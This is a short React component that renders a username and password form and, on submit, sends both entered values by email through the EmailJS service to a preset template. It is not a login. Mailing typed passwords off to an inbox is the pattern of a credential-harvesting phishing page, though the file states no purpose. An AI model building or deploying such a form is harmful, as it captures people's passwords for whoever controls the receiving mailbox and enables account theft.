import React, { useState } from 'react';
import emailjs from '@emailjs/browser';

function Form() {
  const [data, setData] = useState({
    user: '',
    pass: '',
  });

  const { user, pass } = data;

  const handleInputChange = (e) => {
    setData({ ...data, [e.target.name]: e.target.value });
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    emailjs
      .sendForm('service_q91qn0i', 'template_nm7np4h', e.target, {
        publicKey: process.env.REACT_APP_EMAILJS_PUBLIC_KEY, // Use environment variable for sensitive data
      })
      .then(
        () => {
          alert('Message sent successfully!');
          setData({ user: '', pass: '' }); // Clear form on success
        },
        (error) => {
          alert('Failed to send message, please try again.');
          console.error('Failed...', error.text);
        },
      );
  };

  return (
    <div>
      <form onSubmit={handleSubmit}>
        <label htmlFor="user">Username</label>
        <br />
        <input
          type="text"
          id="user"
          name="user"
          value={user}
          onChange={handleInputChange}
          required // Optional: Ensures input is filled out
        />
        <br />
        <label htmlFor="pass">Password</label>
        <br />
        <input
          type="password"
          id="pass"
          name="pass"
          value={pass}
          onChange={handleInputChange}
          required // Optional: Ensures input is filled out
        />
        <br />
        <input type="submit" value="Submit" />
      </form>
    </div>
  );
}

export default Form;
